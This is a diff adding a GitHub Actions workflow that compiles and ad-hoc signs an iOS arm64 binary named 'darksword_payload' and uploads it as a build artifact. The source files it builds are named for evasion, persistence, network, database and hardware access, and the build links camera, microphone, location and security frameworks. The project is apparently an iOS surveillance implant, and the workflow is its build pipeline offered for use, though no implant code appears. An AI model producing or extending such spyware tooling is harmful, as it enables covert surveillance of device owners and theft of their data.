@@ -1,0 +1,33 @@
+name: Build Main iOS Payload
+
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build_payload:
+    runs-on: macos-latest
+
+    steps:
+    - name: Checkout Repository
+      uses: actions/checkout@v4
+
+    - name: Compile Mach-O Executable
+      run: |
+        SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
+        
+        echo "Compiling darksword_payload..."
+        clang++ -arch arm64 -isysroot $SDK_PATH -fobjc-arc \
+          -framework Foundation -framework AVFoundation -framework CoreLocation -framework Security \
+          -lsqlite3 main.mm database.mm network.mm hardware.mm evasion.mm persistence.mm \
+          -o darksword_payload
+
+        echo "Signing executable..."
+        codesign -s - -f darksword_payload
+
+    - name: Upload Payload Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: main_payload_executable
+        path: darksword_payload
